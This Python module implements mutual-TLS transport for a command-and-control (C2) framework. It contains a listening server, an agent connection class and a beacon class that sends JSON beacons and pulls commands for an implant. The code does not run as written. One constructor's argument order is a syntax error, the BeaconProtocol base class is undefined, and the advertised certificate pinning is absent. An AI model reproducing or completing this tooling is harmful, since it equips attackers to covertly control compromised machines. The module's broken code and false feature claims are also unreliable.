#!/usr/bin/env python3
"""
mTLS Protocol Handler - Mutual TLS for C2
Features: Mutual authentication, certificate pinning, encrypted communication
"""

import ssl
import socket
import json
import time
import os
import hashlib
from typing import Optional, Dict, List
import threading
from pathlib import Path

class MTLSServerProtocol:
    """mTLS server handler for C2"""
    
    def __init__(self, cert_path: str, key_path: str, ca_path: str):
        self.cert_path = cert_path
        self.key_path = key_path
        self.ca_path = ca_path
        self.context = None
        self.clients = {}
        
        self.setup_context()
    
    def setup_context(self):
        """Setup SSL context with mTLS"""
        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.context.load_cert_chain(self.cert_path, self.key_path)
        self.context.load_verify_locations(self.ca_path)
        self.context.verify_mode = ssl.CERT_REQUIRED
        self.context.check_hostname = False
    
    def create_server_socket(self, host: str = '0.0.0.0', port: int = 8443):
        """Create mTLS server socket"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.listen(5)
        
        # Wrap with SSL
        return self.context.wrap_socket(sock, server_side=True)


class MTLSAgentProtocol:
    """mTLS agent handler for C2"""
    
    def __init__(self, server_host: str, server_port: int = 8443,
                 cert_path: str, key_path: str, ca_path: str):
        self.server_host = server_host
        self.server_port = server_port
        self.cert_path = cert_path
        self.key_path = key_path
        self.ca_path = ca_path
        self.context = None
        self.socket = None
        
        self.setup_context()
    
    def setup_context(self):
        """Setup SSL context with mTLS"""
        self.context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        self.context.load_cert_chain(self.cert_path, self.key_path)
        self.context.load_verify_locations(self.ca_path)
        self.context.verify_mode = ssl.CERT_REQUIRED
        self.context.check_hostname = False
    
    def connect(self) -> bool:
        """Connect to mTLS server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket = self.context.wrap_socket(sock, server_hostname=self.server_host)
            self.socket.connect((self.server_host, self.server_port))
            return True
        except Exception as e:
            return False
    
    def send_data(self, data: bytes) -> bool:
        """Send data through mTLS"""
        try:
            if self.socket:
                self.socket.send(data)
                return True
        except:
            pass
        return False
    
    def receive_data(self, size: int = 4096) -> Optional[bytes]:
        """Receive data through mTLS"""
        try:
            if self.socket:
                return self.socket.recv(size)
        except:
            pass
        return None


class MTLSBeaconProtocol(BeaconProtocol):
    """mTLS beacon protocol for C2 agent"""
    
    def __init__(self, server: str, port: int, cert_path: str, key_path: str, ca_path: str):
        super().__init__(server, port)
        self.mtls = MTLSAgentProtocol(server, port, cert_path, key_path, ca_path)
        self.mtls.connect()
    
    def send_beacon(self, data: Dict) -> Optional[str]:
        """Send beacon via mTLS"""
        try:
            json_data = json.dumps(data).encode()
            if self.mtls.send_data(json_data):
                return "beacon_sent"
        except:
            pass
        return None
    
    def receive_commands(self) -> Optional[List[Dict]]:
        """Receive commands via mTLS"""
        try:
            data = self.mtls.receive_data()
            if data:
                return json.loads(data)
        except:
            pass
        return None
